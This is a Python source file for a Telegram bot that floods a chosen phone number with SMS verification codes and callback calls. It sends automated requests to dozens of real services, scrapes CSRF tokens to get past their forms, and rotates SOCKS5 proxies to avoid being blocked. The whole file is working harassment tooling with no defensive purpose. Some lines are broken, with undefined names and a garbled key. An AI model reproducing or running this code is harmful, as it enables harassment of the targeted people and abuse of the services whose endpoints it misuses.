from time import time
from time import sleep
from sys import exit
import threading
import re
import random
from random import randint
import requests
import telebot
import db
import cfg
import funcs
import threading

bot = telebot.TeleBot(cfg.token)

class Bomber():

	def __init__(self):
		self.session = requests.Session()
		self.session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'


	def convert_number(self, phone_number):
		if phone_number[0] == '+':
			phone_after = phone_number[1:]
		elif phone_number[0] == '8':
			phone_after = '7' + phone_number[1:]
		elif phone_number[0] == '9':
			phone_after = '7' + phone_number

		return phone_after


	def get_country_code(self, number):
		cc = ''

		if re.match('79', number):
			cc = '+7'
		elif re.match('380', number):
			cc = '+380'
		elif re.match('77', number):
			cc = '+77'
		elif re.match('44', number):
			cc = '+44'

		return cc


	def fancify(self, number):
		return '+' + number[0] + ' ' + number[1:4] + ' ' + number[4:7]\
				+ ' ' + number[7:9] + ' ' + number[9:]


	def fancify2(self, number):
		return '+' + number[0] + ' ' + number[1:4] + ' ' + number[4:]


	def fancify3(self, number):
		return '8(' + number[1:4] + ')' + number[4:7] + '-' + number[7:9] + '-' + number[9:]


	def fancify4(self, number):
		return '+' + number[0] + ' (' + number[1:4] + ') ' + number[4:7] + '-' + number[7:9] + '-' + number[9:]


	def get_attack_type(self):
		if isinstance(self, SMSBomber):
			return 'Смс'
		elif isinstance(self, CallBomber):
			return 'Call'		


	def init_attack(self):
		attack_type = self.get_attack_type()
        
		threading.Thread(target=funcs.parse).start()

		if isinstance(self, SMSBomber):
			db.set_bomber_state('bombing', self.attack_user_id)
			db.act_count_attack("add", self.attack_user_id)

		elif isinstance(self, CallBomber):
			db.set_call_attacks_state('bombing', self.attack_user_id)

		bot.send_message(self.attack_user_id, "📱Телефон: <code>" + self.attack_phone + f"</code>\n⌚️ На время: ...\n{attack_type} спам начался!", parse_mode="html")
		
		self.spam_stop = time() + float(self.attack_seconds)		


	def request(self, url, json=None, params=None, data=None, headers=None, cookies=None, allow_redirects=True, method='post'):
		type = self.get_attack_type()

		stop_sms = db.get_bomber_state(self.attack_user_id) == "stop"
		stop_call = db.get_call_attacks_state(self.attack_user_id) == "stop"
		

		if time() > self.spam_stop:
			db.act_count_attack("remove", self.attack_user_id)

			bot.send_message(self.attack_user_id, "Телефон: <code>" + self.attack_phone + f"</code>\n{type} спам окончен!", parse_mode="html")
			exit()

		if stop_sms and type == 'Смс':
			print('stop_sms')
			db.act_count_attack("remove", self.attack_user_id)
			exit()
				
		if stop_call and type == 'Call':
			print('stop_call')
			exit()
			

		for i in range(3):
			try:
				req = None

				if method == 'post':
					req = self.session.post(url, json=json,  params=params, data=data, headers=headers, cookies=cookies, allow_redirects=allow_redirects, timeout=3)
				elif method == 'get':
					req = self.session.get(url, json=json, params=params, headers=headers, cookies=cookies, allow_redirects=allow_redirects, timeout=3)
			
			except UnboundLocalError:
				pass

			except Exception as e:
				print(e)
				if i == 2:
					db.del_proxy(self.session.proxies['socks5'])
					self.session.proxies = {'socks5': db.get_rand_proxy()}
			else:
				break

		self.session.cookies.clear()

		return req


class SMSBomber(Bomber):

	def __init__(self):
		super(SMSBomber, self).__init__()


	def attack(self, user_id, seconds, phone):
		self.attack_user_id = user_id
		self.attack_phone = phone
		self.attack_seconds = seconds
		self.init_attack()

		number = phone
		number_w_7 = number[1:]

		while True:
			self.session.proxies = {'socks5': db.get_rand_proxy()}

			self.request("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + number})
			self.request('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': number_w_7})
			self.request("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", json={"msisdn": number})
			self.request('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number})
			self.request(f"https://www.citilink.ru/registration/confirm/phone/+{number}/")
			self.request('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + number})
			self.request('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn': number, "locale": 'en', 'countryCode': 'ru', 'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
			self.request("https://youla.ru/web-api/auth/request_code", data={"phone": number})
			self.request("https://moneyman.ru/registration_api/actions/send-confirmation-code", data="+" + number)
			self.request("https://msk.tele2.ru/api/validation/number/" + number, json={"sender": "Tele2"})
			self.request("https://fix-price.ru/ajax/register_phone_code.php", data={"register_call": "Y", "action": "getCode", "phone": "+" + number})
			self.request("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": number})
			self.request("https://client-api.sushi-master.ru/api/v1/auth/init", json={"phone": number})
			self.request('https://b.utair.ru/api/v1/login/', data={'login': number})
			self.request("https://my.modulbank.ru/api/v2/auth/phone", json={"CellPhone": number_w_7})
			self.request("https://www.flipkart.com/api/5/user/otp/generate", headers={"Origin": "https://www.flipkart.com", "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop", }, data={"loginId": "+" + number})
			self.request("https://www.flipkart.com/api/6/user/signup/status", headers={"Origin": "https://www.flipkart.com", "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop", }, json={"loginId": "+" + number, "supportAllStates": True})
			self.request('https://cloud.mail.ru/api/v2/notify/applink', json={"phone": "+" + number, "api": 2, "email": "email", "x-email": "x-email"})
			self.request("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + number})
			self.request('https://passport.twitch.tv/register?trusted_request=true', json={"birthday": {"day": 11, "month": 11, "year": 1999}, "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True, "password": 'sdf4343dsf', "phone_number": number, "username": 'sdf3w4r34sfdsf'})
			self.request("https://api.pozichka.ua/v1/registration/send", json={"RegisterSendForm": {"phone": number}})

			try:
				delivery_club_cookies = self.request('https://api.delivery-club.ru/api1.2/user/login', method='get').cookies.get_dict()
				print('delivery-club', self.request('https://api.delivery-club.ru/api1.2/user/otp', data={'phone':number}, cookies=delivery_club_cookies).text)
				del delivery_club_cookies

				zoopt_cookies = self.request('https://zoopt.ru', method='get').cookies.get_dict()
				print('zoopt', self.request('https://zoopt.ru/api/v2/', data={'module':'salin.core', 'clhttp://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax789321683.php?do=sms_code':r'BonusServer\Auth', 'action':'SendSms', 'phone':number}, cookies=zoopt_cookies).text)
				del zoopt_cookies

			except SystemExit:
				exit()

			except:
				pass

			try:
				zdravcity = self.request('https://zdravcity.ru/', method='get')
				token = re.search(r'(?<=value=")[\d\w]{32}(?=")', zdravcity.text)[0]
				zdr_cookies = zdravcity.cookies.get_dict()
				print(self.request('https://zdravcity.ru/ajax/sendcode.php', data={'phone':number[1:], 'bxsid':token, 'sms1':'Y', 'typeAction':'regUser'}, cookies=zdr_cookies).text)
				del zdravcity, token, zdr_cookies

			except SystemExit:
				exit()

			except:
				pass

			try:
				wildberries = self.request('https://security.wildberries.ru/login', method='get')
				wb_html = HTML(html=wildberries.text)
				verification_token = wb_html.find('input[name="__RequestVerificationToken"]')[0].attrs['value']
				smscoderequest1 = wb_html.find('#BDC_VCID_smsCodeRequest')[0].attrs['value']
				smscoderequest2 = wb_html.find('#BDC_Hs_smsCodeRequest')[0].attrs['value']
				smscoderequest3 = wb_html.find('#BDC_SP_smsCodeRequest')[0].attrs['value']
				self.request('https://security.wildberries.ru/mobile/requestconfirmcode?forAction=EasyLogin', headers={'x-requestverificationtoken':verification_token}, data={'phonemobile':number, 'fancyPhoneMobile':fancify(number), 'phoneInput.FullPhoneMobile':number, 'phoneInput.ConfirmCode':'', 'smsCaptchaCode':'', 'BDC_VCID_smsCodeRequest':smscoderequest1, 'BDC_BackWorkaround_smsCodeRequest':0, 'BDC_Hs_smsCodeRequest':smscoderequest2, 'BDC_SP_smsCodeRequest':smscoderequest3, 'phoneInput.AgreeToReceiveSmsSpam':'false'}, cookies=wildberries.cookies.get_dict())
				del wildberries, wb_html, verification_token, smscoderequest1, smscoderequest2, smscoderequest3
		   
			except SystemExit:
				exit()

			except:
				pass

			try:
				mvideo_cookies = self.request('https://www.mvideo.ru/login', method='get').cookies.get_dict()
				print('mvideo', self.request('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp?pageName=loginByUserPhoneVerification&fromCheckout=false&fromRegisterPage=true&snLogin=&bpg=&snProviderId=',  headers={'user-agent':user_agent}, data={'phone':self.fancify2(number), 'g-recaptcha-response':'', 'recaptcha':'on'}, cookies=mvideo_cookies).text)
				del mvideo_cookies

			except SystemExit:
				exit()

			except:
				pass

			try:
				richfamily = self.request('https://richfamily.ru/', method='get', allow_redirects=False)
				rf_cookies = richfamily.cookies.get_dict()
				richfamily2 = self.request('https://region.richfamily.ru/', method='get')
				rf_cookies.update(richfamily2.cookies.get_dict())
				sessid = re.search(r"(?<=bitrix_sessid':')[\d\w]{32}", richfamily2.text)[0]
				self.request('https://region.richfamily.ru/ajax/sms_activities/getAuthPopup.php',  data={'backurl':'/', 'step':1, 'sessid':sessid}, cookies=rf_cookies)
				print('richfamily', self.request('https://region.richfamily.ru/ajax/sms_activities/sms_validate_phone.php', data={'phone':fancify(number).replace(' ', '-'), 'isAuth':'Y', 'sessid':sessid}, cookies=rf_cookies).text)
				del richfamily, richfamily2, rf_cookies, sessid
			
			except SystemExit:
				exit()

			except:
				pass

			try:
				worki_wsid = self.request('https://worki.ru/', method='get').cookies.get_dict()['wsid']
				print('worki', self.request('https://api.iconjob.co/api/auth/verification_code', json={'phone':number}, headers={'x-web-session':worki_wsid}).text)
				del worki_wsid
			
			except SystemExit:
				exit()

			except:
				pass

			try:
				pliskov = self.request('https://pliskov.ru/requestprocessing?calculatorSystemName=Ascort&amount=5000&days=30', method='get')
				pliskov_rvt = re.search(r'(?<=__RequestVerificationToken: ")[\d\w\-_]+', pliskov.text)[0]
				print('pliskov', self.request('https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode', data={'phone':self.fancify4(number), '__RequestVerificationToken':pliskov_rvt}, cookies=pliskov.cookies.get_dict()).text)
				del pliskov, pliskov_rvt
			
			except SystemExit:
				exit()

			except:
				pass



class CallBomber(Bomber):

	def __init__(self):
		super(CallBomber, self).__init__()

	
	def attack(self, user_id, seconds, phone, interval):
		print('_bomber_call')
		self.attack_phone = phone
		self.attack_seconds = seconds
		self.attack_user_id = user_id
		self.init_attack()

		while True:
			self.session.proxies = {'socks5': db.get_rand_proxy()}
			
			#gk-mic.ru
			self.request('https://server.comagic.ru/api/v1/', json={'comagic_id': "3386957866.5264816395.1599069309", 'hit_id': 14564248285, 'name': "sitephone_call", 'params': {'delay': 0, 'group_id': None, 'phone': phone}, 'site_key': "hMaDG22gDP4_2xITBfaBSEx3LqF79EIq"})
			sleep(interval)
			#https://www.lsr.ru/msk/
			self.request('https://server.comagic.ru/api/v1/', json={'comagic_id': "3393453955.5274252496.1599228498", 'hit_id': 14586501271, 'name': "sitephone_call", 'params': {'delay': 0, 'group_id': None, 'phone': phone}, 'site_key': "kga8nk1RqLcdmqu85GPH3Gqz8WoAZlwg"})
			sleep(interval)
			#https://tushino2018.ru/
			self.request('https://server.comagic.ru/api/v1/', json={'comagic_id': "3393461668.5274264016.1599228654", 'hit_id': 14586501271, 'name': "send_offline_request", 'params': {'email': '', 'is_custom': True, 'delay': 0, 'phone': self.fancify4(phone), 'text': '#simple-order-marker##'}, 'site_key': "lQ5lenUQ09W6dHl0fG5gtnVtGYCGKp_6"})
			sleep(interval)
			#https://absrealty.ru/
			self.request('https://server.comagic.ru/api/v1/', json={'comagic_id': "3269837478.5121648495.1599229071", 'hit_id': 14357355735, 'name': "sitephone_call", 'params': {'delay': 0, 'group_id': None, 'phone': phone}, 'site_key': "gCGlGtkoI6gRE2UCb3RH16tR966sMvd5"})
			sleep(interval)
			#https://www.mechta.su/
			self.request('https://server.comagic.ru/api/v1/', json={'comagic_id': "3393508624.5274332590.1599229554", 'hit_id': 14586692308, 'name': "sitephone_call", 'params': {'delay': 0, 'group_id': None, 'phone': phone}, 'site_key': "gIbIFBYrHtGu_OHoEGE4zbcNxwOBqRwG"})
			sleep(interval)
			#https://akvarel-tmn.ru/
			self.request('https://server.comagic.ru/api/v1/', json={'comagic_id': "3269866419.5121691773.1599229721", 'hit_id': 14357464149, 'name': "sitephone_call", 'params': {'delay': 0, 'group_id': None, 'phone': phone}, 'site_key': "_Tcoxgc9FY_qonG9kVuzfxBqdU1_d6cd"})
			sleep(interval)
			#https://medniy.moscow/
			self.request('https://server.comagic.ru/api/v1/', json={'comagic_id': "3393528319.5274361726.1599229949", 'hit_id': 14586761461, 'name': "sitephone_call", 'params': {'delay': 0, 'group_id': None, 'phone': phone}, 'site_key': "h1zUExzzxl6FGgGGUREbSKMFuUSFN7N5"})
			sleep(interval)
			#https://ukms-project.ru/
			self.request('https://server.comagic.ru/api/v1/', json={'comagic_id': "3393536335.5274373486.1599230110", 'hit_id': 14586815461, 'name': "sitephone_call", 'params': {'delay': 0, 'group_id': None, 'phone': phone}, 'site_key': "YlCPQA8AiARecoiDXshA_2MOUlmaGgrE"})
			sleep(interval)
			#https://xn----8sbkefskfcogb2do0j.xn--p1ai/
			self.request('https://server.comagic.ru/api/v1/', json={'comagic_id': "3393548227.5274391213.1599230355", 'hit_id': 14586832087, 'name': "send_offline_request", 'params': {'email': '', 'is_custom': True, 'delay': 0, 'phone': self.fancify4(phone), 'text': ''}, 'site_key': "S8iMUtzXcghYq0one5RrZH2MMB1DcEL4"})
			sleep(interval)
			#https://rg-dev.ru/
			self.request('https://server.comagic.ru/api/v1/', json={'comagic_id': "3387051856.5275240291.1599243345", 'hit_id': 14588825032, 'name': "sitephone_call", 'params': {'delay': 0, 'group_id': 183673, 'phone': self.fancify4(phone)}, 'site_key': "vbmgOGrZUnZlIpzqMPF2xZP8kSmdq88W"})
			sleep(interval)
			#https://stonehedge.ru/
			self.request('https://server.comagic.ru/api/v1/', json={'comagic_id': "3394141894.5275249939.1599243503", 'hit_id': 14588848720, 'name': "sitephone_call", 'params': {'delay': 0, 'group_id': None, 'phone': phone}, 'site_key': "DzBwsBca_rw56gw1ehgFcbs95494V94x"})
			sleep(interval)
			#http://b2cpl.ru/
			self.request('https://server.comagic.ru/api/v1/', json={'comagic_id': "3270417537.5122520808.1599243864", 'hit_id': 14359562865, 'name': "sitephone_call", 'params': {'delay': 0, 'group_id': None, 'phone': phone}, 'site_key': "x3XTR0SGY5fAvvlX62TmTGEXV9MQ9raF"})
			sleep(interval)

			try:
				granelle = self.request('https://www.granelle.ru/', method='get')
				token = re.search(r"(?<=value=')[\d\w]{64}", granelle.text)[0]
				self.request('https://www.granelle.ru/request/', data={'csrfmiddlewaretoken': token, 'request_type': 'callback', 'url': 'https://www.granelle.ru/', 'name': 'Артем', 'phone': self.fancify4(phone).replace('-', ' ')}, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'https://www.granelle.ru/'}, cookies=granelle.cookies.get_dict())
				del granelle, token
				sleep(interval)
			except:
				pass

			try:
				su22 = self.request('https://su22.ru/', method='get')
				token = re.search(r"(?<=value=')[\d\w]{64}", su22.text)[0]
				self.request('https://su22.ru/request/', data={'csrfmiddlewaretoken': token, 'request_type': 'callback', 'url': 'https://su22.ru/', 'name': 'Артем', 'phone': self.fancify4(phone).replace('-', ' ')}, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'https://su22.ru/'}, cookies=su22.cookies.get_dict())
				del su22, token
				sleep(interval)
			except:
				pass

			try:
				samolet = self.request('https://samolet.ru/', method='get')
				token = re.search(r"(?<=value=')[\d\w]{64}", samolet.text)[0]
				self.request('https://samolet.ru/request/', data={'csrfmiddlewaretoken': token, 'request_type': 'callback', 'url': 'https://samolet.ru/', 'name': 'Артем', 'phone': self.fancify4(phone).replace('-', ' ')}, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'https://samolet.ru/'}, cookies=samolet.cookies.get_dict())
				del samolet, token
				sleep(interval)
			except:
				pass

			self.request('http://gazni.ru/callback.php?popup=true', data={'cur_url': '', 'action': 'post', 'subject': 'Заказан звонок с сайта ГазниСтрой', 'object': 1, 'name': 'Андрей', 'contacts': phone, 'text': ' '})
			self.request('http://codes.cleversite.ru/callback', headers={'Referer': 'http://cleversite.ru/'}, data={'siteid': randint(10000, 100000), 'num': phone, 'day': '', 'time': '', 'dopFields': '', 'title': 'Онлайн консультант для сайта – Бесплатный сервис online чата и обратного звонка от CleverSite', 'referrer': 'http://cleversite.ru/', 'colvis': 1, 'colpage': 2, 'colpageforvisit': 2, 'istok': 'прямой переход по адресу сайта'})	
			self.request('https://alfalife.cc/index.php', data={"phone": phone})
			self.request('https://callmenow.com.ua/client_site/call_query', params={'callback': 'jQuery32109909728079785647_1599000858846', 'u_id': 502, 'client_phone': '+' + phone, 'clientid': '993321197.1599000860', 'lang': 'default', '_': '1599000858856'})
			self.request('https://findclone.ru/register', params={'phone':'+' + phone}, method='get')
